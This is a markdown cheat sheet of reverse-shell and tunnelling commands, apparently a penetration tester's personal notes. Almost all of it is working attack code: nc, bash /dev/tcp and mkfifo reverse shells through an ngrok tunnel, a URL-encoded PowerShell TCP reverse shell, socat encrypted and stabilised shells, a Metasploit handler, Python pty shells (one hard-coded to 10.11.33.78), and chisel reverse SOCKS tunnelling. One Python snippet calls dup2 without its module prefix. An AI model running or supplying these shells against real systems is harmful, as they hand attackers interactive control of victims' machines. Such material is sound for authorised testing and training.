# Multiple choices
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# ngrok as a proxy
```bash
# On attacker (term1)
ngrok tcp 12345

# On attacker (term2)
nc -lvp 12345

# On target, use your reverse shell payload on the ngrok tunnel target
nc NGROK_PUBLIC_IP NGROK_PORT -e /bin/sh
bash -c "bash -i >& /dev/tcp/NGROK_PUBLIC_IP/NGROK_PORT 0>&1"
mkfifo /tmp/f; nc NGROK_PUBLIC_IP NGROK_PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

# Powershell & others
https://www.revshells.com/
```powershell
# Replace <ip> and <port>
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<ip>%27%2C<port>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

# Encrypted shell with socat
```bash
# Create self-signed certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Create our single pem file
cat shell.key shell.crt > shell.pem

# Listen with socat, the cert, and specify verify=0 to not verify whether the cert has been properly signed by a recognised authority.
socat OPENSSL-LISTEN:LISTENING_PORT,cert=shell.pem,verify=0 -
socat OPENSSL-LISTEN:LISTENING_PORT,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

# Connect back
socat OPENSSL:HOST_IP:LISTENING_PORT,verify=0 EXEC:/bin/bash
socat OPENSSL:HOST_IP:LISTENING_PORT,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

# socat not stabilized
```bash
# Same as nc -lvnp LISTENING_PORT
socat TCP-L:LISTENING_PORT -

# Then we connect back from the target
## Windows target
socat TCP:HOST_IP:LISTENING_PORT EXEC:powershell.exe,pipes

## Linux target
socat TCP:HOST_IP:LISTENING_PORT EXEC:"bash -li"
```

# socat fully stabilized (linux only)
```bash
# This also work using ngrok

# Listen on host
socat TCP-L:LISTENING_PORT FILE:`tty`,raw,echo=0

# Connect back
socat TCP:HOST_IP:LISTENING_PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

# Using Metasploit
```bash
msfconsole -q
use multi/handler
set PAYLOAD PAYLOAD
options # Fill the options
exploit -j # Start and run the job in background
```

# Using python
## Inside a script
```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",PORT))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")

```

## Create shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.33.78",33456));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

## Stabilize shell (can go up, get history, ...)
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z
stty raw -echo ; fg
export TERM=xterm

# Web servers on Unix
See /usr/share/webshell to have ready to use webshells, update MY_IP and LISTENING_PORT
```bash
nc -lvnp LISTENING_PORT
```

# Connected on windows (well, maybe not)
https://github.com/jpillora/chisel

```bash
Create binaries
go mod vendor
go build -ldflags "-s -w" # build Linux binary:
env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w" # build Windows binary
```

```bash
# Listening
/opt/chisel/chisel server -p LISTENING_PORT --reverse
```

```sh
# Powershell command
chisel-x64.exe client MY_IP:LISTENING_PORT R:socks
```

http://github.com/certat/intelmq-docker.git